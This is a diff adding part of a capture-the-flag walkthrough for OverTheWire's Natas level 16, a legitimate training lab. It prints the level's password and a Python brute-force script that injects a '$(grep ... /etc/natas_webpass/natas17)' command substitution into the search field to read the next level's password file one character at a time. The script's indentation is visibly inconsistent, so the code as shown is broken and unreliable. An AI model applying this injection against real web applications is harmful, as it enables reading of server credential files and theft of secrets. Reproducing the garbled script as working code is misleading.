@@ -751,7 +751,63 @@ Step 9: Then you will see the password for level-16
 +  Password : hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
 + Domain : http://natas16.natas.labs.overthewire.org
 ## Explination
+Step 1:  Go to Firefox Browser, Then Connect to natas16.natas.labs.overthewire.org, Then login with username and password
+
+Step 2: You will see the page like this
+
+![image](./images-1/image-16.png)
+
+Step 3: Then click view source code
+
+![image](./images-1/image-16-1.png)
+
+Step 4: Then write a code like this, In nano editor, Then save the file, Then Run the file by using python filename. Whole process in kali Linux. Because of it has librabraries, we can't Run it online platform.
+
+    import requests
+    from requests.auth import HTTPBasicAuth
+
+    username = 'natas16'
+    password = 'hPkjKYviLQctEW33QmuXL6eDVfMW4sGo'
+
+    characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
+
+    output = ''
+
+    url = 'http://natas16.natas.labs.overthewire.org'
+
+    for i in range(32):
+          for j in characters:
+             command = f"^$(grep -o ^{output+j} /etc/natas_webpass/natas17)A"
+             payload = {
+            'needle': command,
+            'submit': 'Search'
+              }
+ 
+            # Use params for GET request
+              result = requests.get(
+               url,
+               auth=HTTPBasicAuth(username, password),
+                params=payload
+               )
+
+                str1 = result.text
+
+                start = str1.find('<pre>\n') + len('<pre>\n')
+                 end = str1.find('\n</pre>')
+
+               if start != -1 and end != -1:
+                  str2 = str1[start:end].split('\n')
+
+                     if str2 and str2[0] != 'African':
+                            output += j
+                            print(output)
+                            break
+
+    print("Final Output:", output)
 
 
+Step 5: It will fetch one by one like loop, By using of Bruteforce attack, Then you will wait until it will get the password for level-17
 
+Step 6: It is slow process, That's why we have more patience to get the password for level-17 
 
+![image](./images-1/image-16-2.png)
